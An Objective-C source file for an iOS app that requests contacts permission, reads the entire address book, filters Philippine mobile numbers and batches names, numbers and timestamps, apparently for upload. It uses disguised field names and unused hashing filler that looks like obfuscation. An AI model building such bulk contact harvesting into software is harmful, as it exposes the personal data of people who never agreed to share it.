#import "Mancry_getDevicebaseData+Internal.h"


static uint32_t mancry_contactsLaneStamp = 0;

static uint32_t mancry_contactsJenkins(NSString *text) {
    uint32_t hash = 0;
    const char *bytes = text.UTF8String ?: "";
    for (const char *p = bytes; *p; p++) {
        hash += (uint32_t)(unsigned char)(*p);
        hash += (hash << 10);
        hash ^= (hash >> 6);
    }
    hash += (hash << 3);
    hash ^= (hash >> 11);
    hash += (hash << 15);
    return hash;
}

static NSArray<NSNumber *> *mancry_contactsSlotRibbon(NSInteger slots, NSInteger pitch) {
    NSInteger count = slots < 3 ? 3 : slots;
    NSInteger step = pitch < 1 ? 1 : pitch;
    NSMutableArray<NSNumber *> *ribbon = [NSMutableArray arrayWithCapacity:count];
    uint32_t lane = 0xA5C31u;
    for (NSInteger i = 0; i < count; i++) {
        lane = lane * 1664525u + 1013904223u;
        NSInteger folded = (NSInteger)((lane >> 16) % (uint32_t)(step + 7)) + i;
        [ribbon addObject:@(folded)];
    }
    return ribbon;
}

static void mancry_contactsWarmLane(void) {
    uint32_t hash = mancry_contactsJenkins(@"contacts-phi-batch-lane");
    NSArray<NSNumber *> *ribbon = mancry_contactsSlotRibbon(6, 4);
    uint32_t mix = hash;
    for (NSNumber *slot in ribbon) {
        mix ^= (uint32_t)slot.unsignedIntegerValue;
        mix = (mix << 5) | (mix >> 27);
    }
    mancry_contactsLaneStamp = mix;
}

static NSString *mancry_contactsFoldPhilippinesDigits(NSString *digits) {
    if (digits.length == 13 && [digits hasPrefix:@"6309"]) {
        return [digits substringFromIndex:3];
    }
    if (digits.length == 12 && [digits hasPrefix:@"639"]) {
        return [digits substringFromIndex:2];
    }
    if (digits.length == 11 && [digits hasPrefix:@"09"]) {
        return [digits substringFromIndex:1];
    }
    return digits;
}

@implementation Mancry_getDevicebaseData (Contacts)

+ (NSArray *)getEquipmentContactWithMaxNum:(NSInteger)maxCount WithPerCount:(NSInteger)perCount{
    mancry_contactsWarmLane();
    NSArray *mancry_perContactList = [Mancry_getDevicebaseData getContactBookInNewConditionWithMaxNum:maxCount WithPerCount:perCount  WithRightPhoneNum:^NSString * _Nonnull(NSString * _Nonnull phoneNum) {
           NSString *mancry_phoneNumber = [[phoneNum componentsSeparatedByCharactersInSet:[[NSCharacterSet characterSetWithCharactersInString:@"0123456789"] invertedSet]] componentsJoinedByString:@""];
        // contact
           if ([self mancry_checkmanyPhilippinesWithPhoneIsRight:mancry_phoneNumber] == YES){
               return mancry_contactsFoldPhilippinesDigits(mancry_phoneNumber);
           }else{
               return @"";
           }
       }];
    return mancry_perContactList;
}



+ (NSArray *)getContactBookInNewConditionWithMaxNum:(NSInteger)maxCount WithPerCount:(NSInteger)perCount WithRightPhoneNum:(NSString *(^)(NSString*phoneNum))getRightPhone{
    NSArray *contactData = [Mancry_getDevicebaseData getContactBookInNewConditionWithMaxNum:maxCount WithRightPhoneNum:getRightPhone];
    return  [Mancry_getDevicebaseData getContactBookByGroupWithContactData:contactData WithMaxCount:maxCount WithPerCount:perCount];
}

+ (BOOL)mancry_checkmanyPhilippinesWithPhoneIsRight:(NSString *)phoneNum{
    NSString *mancry_philippines = [[phoneNum componentsSeparatedByCharactersInSet:[[NSCharacterSet characterSetWithCharactersInString:@"0123456789"] invertedSet]] componentsJoinedByString:@""];
    NSString *predice = @"^(9\\d{9}|639\\d{9}|09\\d{9}|6309\\d{9})$";
    // mobile
    NSPredicate *mancry_mobiPredicate = [NSPredicate predicateWithFormat:@"SELF MATCHES %@",predice];
    return [mancry_mobiPredicate evaluateWithObject:mancry_philippines];
}

+ (NSArray *)getContactBookByGroupWithContactData:(NSArray *)contactData WithMaxCount:(NSInteger)maxCount WithPerCount:(NSInteger) perCount{
    NSInteger mancry_leaveCount = contactData.count % perCount;
    // push time
    NSInteger mancry_pushTimeNumadgdcdas = mancry_leaveCount == 0 ? contactData.count/perCount : contactData.count/perCount + 1;
    NSMutableArray *mancry_bathAllContactData = [NSMutableArray array];
    for (int index = 0; index < mancry_pushTimeNumadgdcdas; index++) {
        if (index == mancry_pushTimeNumadgdcdas - 1) {
            NSArray *subArrayss = [NSArray arrayWithArray:[contactData subarrayWithRange:NSMakeRange(perCount * index, contactData.count - perCount * index)]];
            if (subArrayss.count > 0) {
                [mancry_bathAllContactData addObject:subArrayss];
            }
        }else{
            NSArray *mancry_subArray = [NSArray arrayWithArray:[contactData subarrayWithRange:NSMakeRange(perCount * index, perCount)]];
            [mancry_bathAllContactData addObject:mancry_subArray];
        }
    }
    return mancry_bathAllContactData;
}

+ (NSArray *)getContactBookInNewConditionWithMaxNum:(NSInteger)maxCount WithRightPhoneNum:(NSString *(^)(NSString*phoneNum))getRightPhone{
    NSArray *manry_JanaddressBookInfoArr = [Mancry_getDevicebaseData mancry_getAddressBookInfoWithMaxCount:NSIntegerMax];
    NSMutableArray *mancry_allContactData = [[NSMutableArray alloc]init];
    NSMutableArray *allPhoneArray = [NSMutableArray array];
    for(NSDictionary *dic in manry_JanaddressBookInfoArr){
        NSString *contactName = [[NSString stringWithFormat:@"%@ %@",dic[@"lastName"],dic[@"firstName"]] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
     
        NSArray *mancry_phoneNumArray = [NSArray arrayWithArray:dic[@"phoneArray"]];
        // second delete empty phoneNum
        for (NSString *phoneNum in mancry_phoneNumArray) {
            NSString *contactPhone = [TL_Str_Protect(phoneNum) stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
            NSDate *mancry_contactUpdateTime = dic[@"alterTime"];
            NSString *contactUpdateTimeStr = @"";
            if(mancry_contactUpdateTime){
                contactUpdateTimeStr = [NSString stringWithFormat:@"%lld",(long long int)([mancry_contactUpdateTime timeIntervalSince1970]*1000)];
            }
            if (getRightPhone(contactPhone).length > 0) {
                contactPhone = getRightPhone(contactPhone);
                if ([allPhoneArray containsObject:contactPhone] == false && contactPhone.length > 0) {
                        [allPhoneArray addObject:contactPhone];
                        [mancry_allContactData addObject:@{@"lake":contactName ?: @"",@"contactPhone":contactPhone,@"possess":contactUpdateTimeStr,@"contactStorage":@"1",@"condense":@"-99",@"voyage":@""}];
             }
          }
        }
        
    }

        return mancry_allContactData.count > maxCount ? [mancry_allContactData subarrayWithRange:NSMakeRange(0, maxCount)] : mancry_allContactData;

}


+ (void)getContactsPermissionStatusWithCompletion:(void(^)(BOOL granted))completion {
    if (!completion) {
        return;
    }
    
    // 检查通讯录权限状态
    if (@available(iOS 9.0, *)) {
        // iOS 9.0+ 使用 Contacts 框架
        CNAuthorizationStatus mancry_status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
        
        if (mancry_status == CNAuthorizationStatusAuthorized) {
            // 已授权
            completion(YES);
        } else if (mancry_status == CNAuthorizationStatusNotDetermined) {
            // 未确定，请求权限
            CNContactStore *contactStore = [[CNContactStore alloc] init];
            [contactStore requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError * _Nullable error) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    completion(granted);
                });
            }];
        } else {
            // 已拒绝或受限
            completion(NO);
        }
    } else {
        // iOS 9.0 以下使用 AddressBook 框架
        ABAuthorizationStatus mancry_status = ABAddressBookGetAuthorizationStatus();
        
        if (mancry_status == kABAuthorizationStatusAuthorized) {
            // 已授权
            completion(YES);
        } else if (mancry_status == kABAuthorizationStatusNotDetermined) {
            // 未确定，请求权限
            ABAddressBookRef addressBookRef = ABAddressBookCreate();
            ABAddressBookRequestAccessWithCompletion(addressBookRef, ^(bool granted, CFErrorRef error) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    completion(granted);
                });
                if (addressBookRef) {
                    CFRelease(addressBookRef);
                }
            });
        } else {
            // 已拒绝或受限
            completion(NO);
        }
    }
}



+ (NSArray *)mancry_getAddressBookInfoWithMaxCount:(NSInteger)maxCount{

   NSMutableArray *mancry_infoArr = [NSMutableArray new];

   ABAuthorizationStatus mancry_Status = ABAddressBookGetAuthorizationStatus();
   if (mancry_Status != kABAuthorizationStatusAuthorized) {
       return mancry_infoArr;
   }

   ABAddressBookRef addressBookRef = ABAddressBookCreate();
   CFArrayRef arrayRef = ABAddressBookCopyArrayOfAllPeople(addressBookRef);
   long count = CFArrayGetCount(arrayRef);
   for (int i = 0; i < count; i++) {
       NSMutableDictionary *mancry_dic = [NSMutableDictionary new];

       ABRecordRef people = CFArrayGetValueAtIndex(arrayRef, i);

       NSString *firstName=(__bridge NSString *)(ABRecordCopyValue(people, kABPersonFirstNameProperty));

       NSString *lastName=(__bridge NSString *)(ABRecordCopyValue(people, kABPersonLastNameProperty));

       mancry_dic[@"firstName"] = firstName;
       mancry_dic[@"lastName"] = lastName;

       NSMutableArray *phoneArray = [[NSMutableArray alloc]init];
       ABMultiValueRef phones = ABRecordCopyValue(people, kABPersonPhoneProperty);
       for (NSInteger j=0; j<ABMultiValueGetCount(phones); j++) {
           NSString *phone = (__bridge NSString *)(ABMultiValueCopyValueAtIndex(phones, j));
//            NSLog(@"phone=%@", phone);
           [phoneArray addObject:phone];
       }
       mancry_dic[@"phoneArray"] = phoneArray;

       NSDate *creatTime=(__bridge NSDate*)(ABRecordCopyValue(people, kABPersonCreationDateProperty));


       NSDate *alterTime=(__bridge NSDate*)(ABRecordCopyValue(people, kABPersonModificationDateProperty));
       mancry_dic[@"creatTime"] = creatTime;
       mancry_dic[@"alterTime"] = alterTime;

       [mancry_infoArr addObject:mancry_dic];
       
       if (mancry_infoArr.count == maxCount) {
           return mancry_infoArr;
       }
   }
   return mancry_infoArr;
}



@end
